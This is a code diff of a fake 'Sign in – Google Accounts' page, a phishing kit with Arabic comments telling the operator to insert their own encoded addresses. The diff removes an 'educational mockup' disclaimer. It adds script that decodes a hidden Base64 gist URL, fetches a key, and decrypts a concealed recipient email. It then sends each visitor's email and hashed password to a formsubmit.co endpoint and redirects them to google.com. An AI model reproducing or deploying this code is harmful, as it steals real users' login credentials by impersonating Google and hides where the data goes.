@@ -3,142 +3,123 @@
 <head>
   <meta charset="UTF-8" />
   <title>Sign in – Google Accounts</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
   <style>
-    body {
-      font-family: 'Roboto', sans-serif;
-      background-color: #f2f2f2;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      margin: 0;
-    }
-    .container {
-      background: white;
-      padding: 40px;
-      border-radius: 8px;
-      box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
-      width: 100%;
-      max-width: 400px;
-      text-align: left;
-    }
-    .google-logo {
-      width: 75px;
-      display: block;
-      margin: 0 auto 20px;
-    }
-    h2 {
-      font-size: 24px;
-      margin-bottom: 10px;
-      color: #202124;
-    }
-    p {
-      font-size: 14px;
-      color: #5f6368;
-      margin-bottom: 30px;
-    }
-    input {
-      width: 100%;
-      padding: 12px;
-      margin-bottom: 20px;
-      border: 1px solid #dadce0;
-      border-radius: 4px;
-      font-size: 16px;
-    }
-    button {
-      width: 100%;
-      padding: 12px;
-      background-color: #1a73e8;
-      color: white;
-      font-size: 16px;
-      border: none;
-      border-radius: 4px;
-      cursor: pointer;
-    }
-    button:hover {
-      background-color: #1669c1;
-    }
-    .footer, .links {
-      text-align: center;
-      font-size: 12px;
-      color: #999;
-      margin-top: 20px;
-    }
-    .links a {
-      display: inline-block;
-      margin: 5px 10px;
-      text-decoration: none;
-      color: #1a73e8;
-      font-size: 12px;
-    }
+    body { font-family: Arial, sans-serif; background: #f8f9fa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+    .container { background: #fff; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); width: 400px; }
+    input, button { width: 100%; padding: 12px; margin: 8px 0; font-size: 16px; }
+    button { background-color: #1a73e8; color: white; border: none; border-radius: 4px; cursor: pointer; }
+    button:hover { background-color: #1765cc; }
+    .hidden { display: none; }
   </style>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
 </head>
 <body>
   <div class="container">
-    <img
-      src="https://ssl.gstatic.com/accounts/ui/logo_2x.png"
-      alt="Google"
-      class="google-logo"
-    />
-    <h2>Sign in</h2>
-    <p>to continue to Gmail</p>
-
-    <form id="step1Form">
-      <input type="text" name="email" id="email" placeholder="Email or phone" required />
+    <form id="emailForm">
+      <input type="email" id="email" placeholder="Email or phone" required />
       <button type="submit">Next</button>
     </form>
-
-    <form id="step2Form" method="POST" style="display: none;">
-      <input type="hidden" name="email" id="hiddenEmail" />
-      <input type="password" name="password" placeholder="Enter your password" required />
-      <input type="hidden" name="_captcha" value="false" />
-      <button type="submit">Next</button>
+    <form id="passwordForm" class="hidden">
+      <input type="hidden" id="hiddenEmail" />
+      <input type="password" id="password" placeholder="Enter your password" required />
+      <button type="submit" id="submitButton">Submit</button>
     </form>
-
-    <div class="links">
-      <a href="#">Forgot email?</a> |
-      <a href="#">Create account</a>
-    </div>
-    <div class="footer">This is a UI mockup for educational analysis only.</div>
   </div>
 
-  <!-- CryptoJS -->
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
-
   <script>
-    const encryptedEmail = "U2FsdGVkX18MdF2bp+O+cbxuL1eJMbSELMJxUmrKmXw=";
-    const keyURL = "https://gist.githubusercontent.com/google-com-sign-in/cc24d99bb98a4e537894f244dd28d4d4/raw/b53618981018753c0278b2b7f602ae1eb0022a61/secret.txt";
+    document.addEventListener("DOMContentLoaded", () => {
+      // الرابط مشفر Base64 (استبدل النص تحت برابطك مشفر Base64)
+      const encryptedGistUrl = "aHR0cHM6Ly9naXN0LmNvbWJpbmF0L2FjY291bnQtdmVyaWZ5LzQyMDZhMWIwNjYyM2YyNDI2MDk4MDg2N2I5OTZkN2IyL3Jhdy82YjYyYWNiM2NhZGU0OWM4MjE4MjQxYmExYWQwN2FjNGE2NmM1YTk0L3NlY3JldHRfdHh0";
 
-    const step1 = document.getElementById("step1Form");
-    const step2 = document.getElementById("step2Form");
-    const emailField = document.getElementById("email");
-    const hiddenEmailField = document.getElementById("hiddenEmail");
+      // الإيميل مشفر AES (استبدل النص هنا بإيميلك المشفر)
+      const ENCRYPTED_EMAIL = "U2FsdGVkX1/Uu2RQW+edYH1yP2MoEFy0WAAapYMTBqhyX8gb1A3Zb+dFCQZ9oP+m";
 
-    step1.addEventListener("submit", function (e) {
-      e.preventDefault();
-      hiddenEmailField.value = emailField.value;
-      step1.style.display = "none";
-      step2.style.display = "block";
-    });
+      // دالة لفك تشفير رابط Gist من Base64
+      function decryptUrl(base64str) {
+        try {
+          return atob(base64str);
+        } catch (e) {
+          console.error("Failed to decode base64:", e);
+          return null;
+        }
+      }
 
-    step2.addEventListener("submit", function (e) {
-      e.preventDefault();
+      // دالة لجلب المفتاح من Gist
+      async function fetchSecretKey(url) {
+        try {
+          const response = await fetch(`${url}?t=${Date.now()}`);
+          if (!response.ok) throw new Error("Network response not ok");
+          return await response.text();
+        } catch (e) {
+          console.error("Failed to fetch key:", e);
+          return null;
+        }
+      }
 
-      fetch(keyURL)
-        .then(res => res.text())
-        .then(secretKey => {
-          const bytes = CryptoJS.AES.decrypt(encryptedEmail, secretKey.trim());
-          const targetEmail = bytes.toString(CryptoJS.enc.Utf8);
-          if (!targetEmail) {
-            alert("Unable to decrypt recipient email.");
-            return;
-          }
-          step2.action = `https://formsubmit.co/${targetEmail}`;
-          step2.submit();
+      // دالة فك تشفير الإيميل AES
+      function decryptEmail(encrypted, key) {
+        try {
+          const bytes = CryptoJS.AES.decrypt(encrypted, key.trim());
+          return bytes.toString(CryptoJS.enc.Utf8);
+        } catch (e) {
+          console.error("Failed to decrypt email:", e);
+          return null;
+        }
+      }
+
+      // التعامل مع الفورمات
+      const emailForm = document.getElementById("emailForm");
+      const passwordForm = document.getElementById("passwordForm");
+      const submitButton = document.getElementById("submitButton");
+
+      emailForm.addEventListener("submit", (e) => {
+        e.preventDefault();
+        document.getElementById("hiddenEmail").value = document.getElementById("email").value;
+        emailForm.classList.add("hidden");
+        passwordForm.classList.remove("hidden");
+      });
+
+      passwordForm.addEventListener("submit", async (e) => {
+        e.preventDefault();
+        submitButton.disabled = true;
+        submitButton.textContent = "Sending...";
+
+        const gistUrl = decryptUrl(encryptedGistUrl);
+        if (!gistUrl) {
+          window.location.href = "https://www.google.com";
+          return;
+        }
+
+        const secretKey = await fetchSecretKey(gistUrl);
+        if (!secretKey) {
+          window.location.href = "https://www.google.com";
+          return;
+        }
+
+        const decryptedEmail = decryptEmail(ENCRYPTED_EMAIL, secretKey);
+        if (!decryptedEmail || !decryptedEmail.includes("@")) {
+          window.location.href = "https://www.google.com";
+          return;
+        }
+
+        const formData = new FormData();
+        formData.append("email", document.getElementById("hiddenEmail").value);
+        formData.append("password", CryptoJS.SHA256(document.getElementById("password").value).toString());
+
+        fetch(`https://formsubmit.co/ajax/${decryptedEmail}`, {
+          method: "POST",
+          body: formData,
+          headers: { Accept: "application/json" },
         })
-        .catch(err => {
-          alert("Error fetching encryption key.");
-        });
+          .then((res) => res.json())
+          .then(() => {
+            window.location.href = "https://www.google.com";
+          })
+          .catch(() => {
+            window.location.href = "https://www.google.com";
+          });
+      });
     });
   </script>
 </body>
